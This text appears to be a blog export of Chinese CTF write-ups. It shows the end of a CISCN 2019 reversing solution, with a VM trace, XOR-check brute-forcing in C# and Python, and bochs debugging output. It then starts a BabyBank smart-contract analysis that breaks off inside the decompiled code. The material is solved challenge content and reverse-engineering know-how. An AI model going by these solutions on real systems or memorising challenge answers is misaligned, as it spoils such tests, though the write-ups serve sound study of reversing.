buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '136')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '136')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '137')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '137')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[0] = 129buf[1] = buf[0]buf[2] = 9buf[1] += buf[2]buf[3] = code[buf[0]] # ('Read code, offset:', '129')buf[4] = code[buf[1]] # ('Read code, offset:', '138')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126print 'wrong' 上面是在 buf[3] != 0 的时候，输出 wrong 的情况，如果在这个条件判断中都正确的话，会产生以下代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122buf[0] = 129buf[1] = buf[0]buf[2] = 9buf[1] += buf[2]buf[3] = code[buf[0]] # ('Read code, offset:', '129')buf[4] = code[buf[1]] # ('Read code, offset:', '138')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '130')buf[4] = code[buf[1]] # ('Read code, offset:', '139')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '131')buf[4] = code[buf[1]] # ('Read code, offset:', '140')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '132')buf[4] = code[buf[1]] # ('Read code, offset:', '141')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '133')buf[4] = code[buf[1]] # ('Read code, offset:', '142')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '134')buf[4] = code[buf[1]] # ('Read code, offset:', '143')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '135')buf[4] = code[buf[1]] # ('Read code, offset:', '144')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '136')buf[4] = code[buf[1]] # ('Read code, offset:', '145')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90buf[3] = code[buf[0]] # ('Read code, offset:', '137')buf[4] = code[buf[1]] # ('Read code, offset:', '146')buf[3] -= buf[4]buf[4] = 126if buf[3] != 0: pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0: pc = buf[4] # jmp 90print 'right' 人脑逆向机简化一波代码，就是一个 9 次的循环异或，并在最后进行比较： 1234567891011i = 129while True: code[i] = code[i] ^ (code[i] &lt;&lt; 8) ^ (code[i] &lt;&lt; 16) ^ (code[i] &lt;&lt; 24) ^ code[i - 1] ^ (code[i - 1] &lt;&lt; 8) ^ (code[i - 1] &lt;&lt; 16) ^ (code[i - 1] &lt;&lt; 24) i += 1 if i - 138 == 0: breakfor i in range(9): if code[138 + i] - code[129 + i] != 0: print 'wrong' exit()print 'right' 这里已知正确的数据在计算后的结果，可以通过爆破来得到（爆破范围比较大，Python 会消耗很多时间，这里用 C#）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546using System;namespace Solve &#123; class Program &#123; public static byte[] intToBytes(uint value) &#123; byte[] res = new byte[4]; res[3] = (byte) ((value &gt;&gt; 24) &amp; 0xFF); res[2] = (byte) ((value &gt;&gt; 16) &amp; 0xFF); res[1] = (byte) ((value &gt;&gt; 8) &amp; 0xFF); res[0] = (byte) (value &amp; 0xFF); return res; &#125; public static string asciiToString(byte[] array) &#123; return Convert.ToString(System.Text.Encoding.ASCII.GetString(array)); &#125; static void Main(string[] args) &#123; var data = new uint[] &#123; 0x61646238, 0x36353465, 0x6361352d, 0x31312d38, 0x612d3965, 0x2d316331, 0x39653838, 0x30386566, 0x66616566, 0x57635565, 0x06530401, 0x1f494949, 0x5157071f, 0x575f4357, 0x57435e57, 0x4357020a, 0x575e035e, 0x0f590000, 0x6e6f7277, 0x20202067, 0x00202020, 0x72726f63, 0x20746365, 0x20202020, 0x6c660020, 0x69206761, 0x6c662073, 0x597b6761, 0x5072756f, 0x68637461, 0x2020207d, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0xffffff00, 0xffffffff &#125;; var ans = new uint[data.Length]; var patch = new byte[data.Length * 4]; for(uint i = 0; i &lt; 9; i++) &#123; uint t = 0; for(uint j = 0; j &lt;= 0x7FFFFFFF; j++) &#123; t = j ^ (j &lt;&lt; 8) ^ (j &lt;&lt; 16) ^ (j &lt;&lt; 24); if(i &gt; 0) &#123; t ^= ans[i - 1] ^ (ans[i - 1] &lt;&lt; 8) ^ (ans[i - 1] &lt;&lt; 16) ^ (ans[i - 1] &lt;&lt; 24); &#125; if(t == data[i + 9]) &#123; // 0x57635565 ans[i] = j; patch[4 * i] = intToBytes(j)[0]; patch[4 * i + 1] = intToBytes(j)[1]; patch[4 * i + 2] = intToBytes(j)[2]; patch[4 * i + 3] = intToBytes(j)[3]; Console.WriteLine(&quot;0x&#123;0:X8&#125;&quot;, j); break; &#125; &#125; &#125; string flag = asciiToString(patch); Console.WriteLine(flag); &#125; &#125;&#125; 当然在已知数据的情况下也可以直接逆回来： 12345678#!/usr/bin/env pythondata = [0x57635565, 0x06530401, 0x1F494949, 0x5157071F, 0x575F4357, 0x57435E57, 0x4357020A, 0x575E035E, 0x0F590000, 0x00000000]flag = ''for i in range(9): flag += libnum.n2s(data[i] ^ ((data[i] &lt;&lt; 8) &amp; 0xFFFFFFFF))[::-1] data[i + 1] = data[i] ^ data[i + 1]print flag bochs 调试这道题其实主要通过 bochs 进行动态调试来分析，下面附上动态调试的一些过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;bochs:1&gt; b 0x7c00&lt;bochs:2&gt; c00000004662i[BIOS ] $Revision: 13073 $ $Date: 2017-02-16 22:43:52 +0100 (Do, 16. Feb 2017) $00000318050i[KBD ] reset-disable command received00000320819i[BIOS ] Starting rombios3200000321257i[BIOS ] Shutdown flag 000000321840i[BIOS ] ram_size=0x0200000000000322261i[BIOS ] ram_end=32MB00000362829i[BIOS ] Found 1 cpu(s)00000376413i[BIOS ] bios_table_addr: 0x000f9cd8 end=0x000fcc0000000704208i[PCI ] i440FX PMC write to PAM register 59 (TLB Flush)00001032137i[P2ISA ] PCI IRQ routing: PIRQA# set to 0x0b00001032156i[P2ISA ] PCI IRQ routing: PIRQB# set to 0x0900001032175i[P2ISA ] PCI IRQ routing: PIRQC# set to 0x0b00001032194i[P2ISA ] PCI IRQ routing: PIRQD# set to 0x0900001032204i[P2ISA ] write: ELCR2 = 0x0a00001032974i[BIOS ] PIIX3/PIIX4 init: elcr=00 0a00001040697i[BIOS ] PCI: bus=0 devfn=0x00: vendor_id=0x8086 device_id=0x1237 class=0x060000001042976i[BIOS ] PCI: bus=0 devfn=0x08: vendor_id=0x8086 device_id=0x7000 class=0x060100001045094i[BIOS ] PCI: bus=0 devfn=0x09: vendor_id=0x8086 device_id=0x7010 class=0x010100001045323i[PIDE ] new BM-DMA address: 0xc00000001045939i[BIOS ] region 4: 0x0000c00000001047953i[BIOS ] PCI: bus=0 devfn=0x0a: vendor_id=0x8086 device_id=0x7020 class=0x0c0300001048157i[UHCI ] new base address: 0xc02000001048773i[BIOS ] region 4: 0x0000c02000001048901i[UHCI ] new irq line = 900001050796i[BIOS ] PCI: bus=0 devfn=0x0b: vendor_id=0x8086 device_id=0x7113 class=0x068000001051028i[ACPI ] new irq line = 1100001051040i[ACPI ] new irq line = 900001051065i[ACPI ] new PM base address: 0xb00000001051079i[ACPI ] new SM base address: 0xb10000001051107i[PCI ] setting SMRAM control register to 0x4a00001215200i[CPU0 ] Enter to System Management Mode00001215200i[CPU0 ] enter_system_management_mode: temporary disable VMX while in SMM mode00001215210i[CPU0 ] RSM: Resuming from System Management Mode00001379231i[PCI ] setting SMRAM control register to 0x0a00001394138i[BIOS ] MP table addr=0x000f9db0 MPC table addr=0x000f9ce0 size=0xc800001395960i[BIOS ] SMBIOS table addr=0x000f9dc000001398141i[BIOS ] ACPI tables: RSDP addr=0x000f9ee0 ACPI DATA addr=0x01ff0000 size=0xf7200001401353i[BIOS ] Firmware waking vector 0x1ff00cc00001403148i[PCI ] i440FX PMC write to PAM register 59 (TLB Flush)00001403871i[BIOS ] bios_table_cur_addr: 0x000f9f0400001531488i[VBIOS ] VGABios $Id: vgabios.c,v 1.76 2013/02/10 08:07:03 vruppert Exp $00001531559i[BXVGA ] VBE known Display Interface b0c000001531591i[BXVGA ] VBE known Display Interface b0c500001534516i[VBIOS ] VBE Bios $Id: vbe.c,v 1.65 2014/07/08 18:02:25 vruppert Exp $00014040189i[BIOS ] Booting from 0000:7c00(0) Breakpoint 1, 0x0000000000007c00 in ?? ()Next at t=14040244(0) [0x000000007c00] 0000:7c00 (unk. ctxt): jmpf 0x07c0:0005 ; ea0500c007 可以用 show mode 命令来显示实模式向保护模式的转换： 123&lt;bochs:3&gt; show modeshow mode switch: ONshow mask is: mode 利用 u 命令来查看汇编代码，这里是实模式的部分： 12345678910111213141516171819202122232425262728293031323334&lt;bochs:7&gt; u/40 0x7c0000007c00: ( ): jmpf 0x07c0:0005 ; ea0500c00700007c05: ( ): mov ax, cs ; 8cc800007c07: ( ): mov ds, ax ; 8ed800007c09: ( ): mov ss, ax ; 8ed000007c0b: ( ): mov sp, 0x0400 ; bc000400007c0e: ( ): cld ; fc00007c0f: ( ): mov ax, 0x0003 ; b8030000007c12: ( ): int 0x10 ; cd1000007c14: ( ): mov dx, 0x0000 ; ba000000007c17: ( ): mov cx, 0x0002 ; b9020000007c1a: ( ): mov ax, 0x1000 ; b8001000007c1d: ( ): mov es, ax ; 8ec000007c1f: ( ): xor bx, bx ; 31db00007c21: ( ): mov ax, 0x0228 ; b8280200007c24: ( ): int 0x13 ; cd1300007c26: ( ): jnb .+2 ; 730200007c28: ( ): jmp .-2 ; ebfe00007c2a: ( ): cli ; fa00007c2b: ( ): mov ax, 0x1000 ; b8001000007c2e: ( ): mov ds, ax ; 8ed800007c30: ( ): xor ax, ax ; 31c000007c32: ( ): mov es, ax ; 8ec000007c34: ( ): mov cx, 0x2000 ; b9002000007c37: ( ): sub si, si ; 29f600007c39: ( ): sub di, di ; 29ff00007c3b: ( ): rep movsb byte ptr es:[di], byte ptr ds:[si] ; f3a400007c3d: ( ): mov ax, 0x07c0 ; b8c00700007c40: ( ): mov ds, ax ; 8ed800007c42: ( ): lidt ds:0x006f ; 0f011e6f0000007c47: ( ): lgdt ds:0x0075 ; 0f0116750000007c4c: ( ): mov ax, 0x0001 ; b8010000007c4f: ( ): lmsw ax ; 0f01f000007c52: ( ): jmpf 0x0008:0000 ; ea00000800 在指令 lmsw ax 处看到实模式向保护模式的转换： 1234567&lt;bochs:39&gt; nNext at t=15885325(0) [0x000000007c4f] 07c0:004f (unk. ctxt): lmsw ax ; 0f01f0&lt;bochs:40&gt;00015885326: switched from &apos;real mode&apos; to &apos;protected mode&apos;Next at t=15885326(0) [0x000000007c52] 07c0:0000000000000052 (unk. ctxt): jmpf 0x0008:0000 ; ea00000800 保护模式的前一段部分： 12345678910111213&lt;bochs:42&gt; u/20 0x0000000000: ( ): mov eax, 0x00000010 ; b81000000000000005: ( ): mov ds, ax ; 8ed800000007: ( ): lss esp, ds:0x00000b5c ; 0fb2255c0b00000000000e: ( ): call .+120 ; e87800000000000013: ( ): call .+107 ; e86b00000000000018: ( ): mov eax, 0x00000010 ; b8100000000000001d: ( ): mov ds, ax ; 8ed80000001f: ( ): mov es, ax ; 8ec000000021: ( ): mov fs, ax ; 8ee000000023: ( ): mov gs, ax ; 8ee800000025: ( ): lss esp, ds:0x00000b5c ; 0fb2255c0b00000000002c: ( ): xor ebx, ebx ; 31db IDTR 的初始化： 1234567891011121314&lt;bochs:39&gt; u/20 0x8b0000008b: ( ): mov edx, 0x000000fc ; bafc00000000000090: ( ): mov eax, 0x00080000 ; b80000080000000095: ( ): mov ax, dx ; 6689d000000098: ( ): mov dx, 0x8e00 ; 66ba008e0000009c: ( ): lea edi, dword ptr ds:0x00000128 ; 8d3d28010000000000a2: ( ): mov ecx, 0x00000100 ; b900010000000000a7: ( ): mov dword ptr ds:[edi], eax ; 8907000000a9: ( ): mov dword ptr ds:[edi+4], edx ; 895704000000ac: ( ): add edi, 0x00000008 ; 83c708000000af: ( ): dec ecx ; 49000000b0: ( ): jnz .-11 ; 75f5000000b2: ( ): lidt ds:0x0000011c ; 0f011d1c010000000000b9: ( ): ret ; c3 GDTR 的初始化： 123&lt;bochs:68&gt; u/10 0x8300000083: ( ): lgdt ds:0x00000122 ; 0f0115220100000000008a: ( ): ret ; c3 用 sreg 命令可以看到 GDTR 和 IDTR 寄存器被初始化了： 1234567891011121314151617&lt;bochs:75&gt; sreges:0x0000, dh=0x00009300, dl=0x0000ffff, valid=7 Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessedcs:0x0008, dh=0x00c09b00, dl=0x000007ff, valid=1 Code segment, base=0x00000000, limit=0x007fffff, Execute/Read, Non-Conforming, Accessed, 32-bitss:0x0010, dh=0x00c09300, dl=0x000007ff, valid=7 Data segment, base=0x00000000, limit=0x007fffff, Read/Write, Accessedds:0x0010, dh=0x00c09300, dl=0x000007ff, valid=7 Data segment, base=0x00000000, limit=0x007fffff, Read/Write, Accessedfs:0x0000, dh=0x00009300, dl=0x0000ffff, valid=1 Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessedgs:0x0000, dh=0x00009300, dl=0x0000ffff, valid=1 Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessedldtr:0x0000, dh=0x00008200, dl=0x0000ffff, valid=1tr:0x0000, dh=0x00008b00, dl=0x0000ffff, valid=1gdtr:base=0x0000000000000928, limit=0x1fidtr:base=0x0000000000000128, limit=0x7ff 最后是虚拟机指令部分： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;bochs:43&gt; u/110 0xb7c00000b7c: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000b83: ( ): mov dword ptr ds:[ecx], eax ; 890100000b85: ( ): jmp .+366 ; e96e01000000000b8a: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000b91: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000b93: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000b9a: ( ): mov dword ptr ds:[ecx], eax ; 890100000b9c: ( ): jmp .+343 ; e95701000000000ba1: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000ba8: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000baa: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000bb1: ( ): lea eax, dword ptr ds:[eax*4+3400] ; 8d0485480d000000000bb8: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000bba: ( ): mov dword ptr ds:[ecx], eax ; 890100000bbc: ( ): jmp .+311 ; e93701000000000bc1: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000bc8: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000bca: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000bd1: ( ): mov ecx, dword ptr ds:[ecx] ; 8b0900000bd3: ( ): lea ecx, dword ptr ds:[ecx*4+3400] ; 8d0c8d480d000000000bda: ( ): mov dword ptr ds:[ecx], eax ; 890100000bdc: ( ): jmp .+279 ; e91701000000000be1: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000be8: ( ): mov edx, dword ptr ds:[eax] ; 8b1000000bea: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000bf1: ( ): mov eax, dword ptr ds:[ecx] ; 8b0100000bf3: ( ): add eax, edx ; 01d000000bf5: ( ): mov dword ptr ds:[ecx], eax ; 890100000bf7: ( ): jmp .+252 ; e9fc00000000000bfc: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c03: ( ): mov edx, dword ptr ds:[eax] ; 8b1000000c05: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000c0c: ( ): mov eax, dword ptr ds:[ecx] ; 8b0100000c0e: ( ): sub eax, edx ; 29d000000c10: ( ): mov dword ptr ds:[ecx], eax ; 890100000c12: ( ): jmp .+225 ; e9e100000000000c17: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c1e: ( ): mov edx, dword ptr ds:[eax] ; 8b1000000c20: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000c27: ( ): mov eax, dword ptr ds:[ecx] ; 8b0100000c29: ( ): xor eax, edx ; 31d000000c2b: ( ): mov dword ptr ds:[ecx], eax ; 890100000c2d: ( ): jmp .+198 ; e9c600000000000c32: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c39: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000c3b: ( ): lea edx, dword ptr ds:[ecx*4+2916] ; 8d148d640b000000000c42: ( ): mov cl, al ; 88c100000c44: ( ): mov eax, dword ptr ds:[edx] ; 8b0200000c46: ( ): shl eax, cl ; d3e000000c48: ( ): mov dword ptr ds:[edx], eax ; 890200000c4a: ( ): jmp .+169 ; e9a900000000000c4f: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c56: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000c58: ( ): lea edx, dword ptr ds:[ecx*4+2916] ; 8d148d640b000000000c5f: ( ): mov cl, al ; 88c100000c61: ( ): mov eax, dword ptr ds:[edx] ; 8b0200000c63: ( ): shr eax, cl ; d3e800000c65: ( ): mov dword ptr ds:[edx], eax ; 890200000c67: ( ): jmp .+140 ; e98c00000000000c6c: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c73: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000c75: ( ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000c7c: ( ): mov edx, dword ptr ds:[ecx] ; 8b1100000c7e: ( ): and eax, edx ; 21d000000c80: ( ): mov dword ptr ds:[ecx], eax ; 890100000c82: ( ): jmp .+116 ; eb7400000c84: ( ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b000000000c8b: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000c8d: ( ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000c93: ( ): mov dword ptr ds:[ecx], eax ; 890100000c95: ( ): iret ; cf00000c96: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c9d: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000c9f: ( ): test eax, eax ; 85c000000ca1: ( ): jnz .+85 ; 755500000ca3: ( ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b000000000caa: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000cac: ( ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000cb2: ( ): mov dword ptr ds:[ecx], eax ; 890100000cb4: ( ): iret ; cf00000cb5: ( ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000cbc: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000cbe: ( ): test eax, eax ; 85c000000cc0: ( ): jz .+54 ; 743600000cc2: ( ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b000000000cc9: ( ): mov eax, dword ptr ds:[eax] ; 8b0000000ccb: ( ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000cd1: ( ): mov dword ptr ds:[ecx], eax ; 890100000cd3: ( ): iret ; cf00000cd4: ( ): lea eax, dword ptr ds:0x00000f94 ; 8d05940f000000000cda: ( ): call .-3061 ; e80bf4ffff00000cdf: ( ): hlt ; f400000ce0: ( ): lea eax, dword ptr ds:0x00000fa0 ; 8d05a00f000000000ce6: ( ): call .-3073 ; e8fff3ffff00000ceb: ( ): lea eax, dword ptr ds:0x00000fae ; 8d05ae0f000000000cf1: ( ): call .-3084 ; e8f4f3ffff00000cf6: ( ): hlt ; f400000cf7: ( ): hlt ; f400000cf8: ( ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000cfe: ( ): mov eax, dword ptr ds:[ecx] ; 8b0100000d00: ( ): add eax, 0x00000003 ; 83c00300000d03: ( ): mov dword ptr ds:[ecx], eax ; 890100000d05: ( ): iret ; cf Referenceshttps://www.52pojie.cn/thread-936377-1-1.htmlhttps://blog.csdn.net/ice__snow/article/details/50654629https://blog.51cto.com/4201689/1420063https://www.cnblogs.com/playmak3r/p/12079833.htmlhttps://blog.qrzbing.cn/2019/04/27/CISCN2019-strange-int/http://imushan.com/2018/07/11/os/Bochs%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E7%AF%87/https://www.cnblogs.com/mlzrq/p/10223079.html#%E4%BD%BF%E7%94%A8bochs%E8%B0%83%E8%AF%95https://mrh1s.top/posts/d2cf12e4/","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"}]},{"title":"2019-CISCN-BabyBank","slug":"[TODO]2019-CISCN-BabyBank","date":"2020-01-21T07:08:39.000Z","updated":"2020-02-25T07:02:13.121Z","comments":true,"path":"2020/01/21/[TODO]2019-CISCN-BabyBank/","link":"","permalink":"qianfei11.coding.me/2020/01/21/[TODO]2019-CISCN-BabyBank/","excerpt":"第一道智能合约题。","text":"第一道智能合约题。 Analysis题目给了一部分代码以及合约在 ropsten 上的地址。这一部分代码 broken.sol 中可以得到一部分的信息。当账户余额大于等于 10000 时，就可以往邮箱中发送 flag： 12345678910111213141516pragma solidity ^0.4.24;contract DaysBank &#123; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; uint) public gift; address owner; constructor()public&#123; owner = msg.sender; &#125; event SendFlag(uint256 flagnum, string b64email); function payforflag(string b64email) public &#123; require(balanceOf[msg.sender] &gt;= 10000); emit SendFlag(1,b64email); &#125; 公链信息中只能找到合约的 ABI，通过在Online Solidity Decompiler进行反编译（或者可以通过 JEB for Ethereum 来进行反编译）。反编译的结果中，memory 数组部分其实是对 balanceOf 和 gift 两个数组的操作。main 函数中先对合约数据合法性的判断，然后进入分支语句进行函数调用，如果无对应函数，则直接回退。还有在 payforflag 函数部分中的 emit 触发事件反编译的结果是一些错误的结果。经过分析后加上一些注释： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261contract Contract &#123; function main() &#123; memory[0x40:0x60] = 0x80; // judge the legality of data if (msg.data.length &lt; 0x04) &#123; revert(memory[0x00:0x00]); &#125; var var0 = msg.data[0x00:0x20] / 0x0100000000000000000000000000000000000000000000000000000000 &amp; 0xffffffff; // find the corresponding function if (var0 == 0x652e9d91) &#123; // Dispatch table entry for 0x652e9d91 (unknown) var var1 = msg.value; if (var1) &#123; revert(memory[0x00:0x00]); &#125; var1 = 0x009c; func_01DC(); stop(); &#125; else if (var0 == 0x66d16cc3) &#123; // Dispatch table entry for profit() var1 = msg.value; if (var1) &#123; revert(memory[0x00:0x00]); &#125; var1 = 0x009c; profit(); stop(); &#125; else if (var0 == 0x6bc344bc) &#123; // Dispatch table entry for payforflag(string) var1 = msg.value; if (var1) &#123; revert(memory[0x00:0x00]); &#125; var temp0 = memory[0x40:0x60]; var temp1 = msg.data[0x04:0x24]; var temp2 = msg.data[temp1 + 0x04:temp1 + 0x04 + 0x20]; memory[0x40:0x60] = temp0 + (temp2 + 0x1f) / 0x20 * 0x20 + 0x20; memory[temp0:temp0 + 0x20] = temp2; var1 = 0x009c; memory[temp0 + 0x20:temp0 + 0x20 + temp2] = msg.data[temp1 + 0x24:temp1 + 0x24 + temp2]; var var2 = temp0; payforflag(var2); stop(); &#125; else if (var0 == 0x70a08231) &#123; // Dispatch table entry for balanceOf(address) var1 = msg.value; if (var1) &#123; revert(memory[0x00:0x00]); &#125; var1 = 0x013a; var2 = msg.data[0x04:0x24] &amp; 0xffffffffffffffffffffffffffffffffffffffff; var2 = balanceOf(var2); label_013A: var temp3 = memory[0x40:0x60]; memory[temp3:temp3 + 0x20] = var2; var temp4 = memory[0x40:0x60]; return memory[temp4:temp4 + temp3 - temp4 + 0x20]; &#125; else if (var0 == 0x7ce7c990) &#123; // Dispatch table entry for transfer2(address,uint256) var1 = msg.value; if (var1) &#123; revert(memory[0x00:0x00]); &#125; var1 = 0x009c; var2 = msg.data[0x04:0x24] &amp; 0xffffffffffffffffffffffffffffffffffffffff; var var3 = msg.data[0x24:0x44]; transfer2(var2, var3); stop(); &#125; else if (var0 == 0xa9059cbb) &#123; // Dispatch table entry for transfer(address,uint256) var1 = msg.value; if (var1) &#123; revert(memory[0x00:0x00]); &#125; var1 = 0x009c; var2 = msg.data[0x04:0x24] &amp; 0xffffffffffffffffffffffffffffffffffffffff; var3 = msg.data[0x24:0x44]; transfer(var2, var3); stop(); &#125; else if (var0 == 0xcbfc4bce) &#123; // Dispatch table entry for gift(address) var1 = msg.value; if (var1) &#123; revert(memory[0x00:0x00]); &#125; var1 = 0x013a; var2 = msg.data[0x04:0x24] &amp; 0xffffffffffffffffffffffffffffffffffffffff; var2 = gift(var2); goto label_013A; &#125; else &#123; revert(memory[0x00:0x00]); &#125; &#125; function func_01DC() &#123; // gift[msg.sender] == 0 memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x01; if (storage[keccak256(memory[0x00:0x40])]) &#123; revert(memory[0x00:0x00]); &#125; // balanceOf[msg.sender] += 1 // gift[msg.sender] = 1 memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x00; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01; memory[0x20:0x40] = 0x01; storage[keccak256(memory[0x00:0x40])] = 0x01; &#125; function profit() &#123; // balanceOf[msg.sender] == 1 memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x00; if (storage[keccak256(memory[0x00:0x40])] != 0x01) &#123; revert(memory[0x00:0x00]); &#125; // gift[msg.sender] == 1 memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x01; if (storage[keccak256(memory[0x00:0x40])] != 0x01) &#123; revert(memory[0x00:0x00]); &#125; // 